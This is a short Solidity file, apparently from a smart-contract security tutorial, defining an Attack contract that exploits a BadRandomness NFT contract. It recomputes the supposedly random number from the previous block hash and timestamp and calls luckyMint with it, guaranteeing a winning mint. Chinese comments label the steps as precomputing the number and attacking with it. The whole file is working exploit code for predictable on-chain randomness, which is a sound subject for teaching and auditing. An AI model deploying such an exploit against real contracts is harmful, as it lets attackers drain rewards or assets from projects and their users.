// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.18;

import {BadRandomness} from "../src/BadRandomness.sol";

contract Attack {
    function attackMint(BadRandomness nftAddr) external {
        // 提前计算随机数
        uint256 luckyNumber = uint256(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        ) % 100;
        // 利用 luckyNumber 攻击
        nftAddr.luckyMint(luckyNumber);
    }
}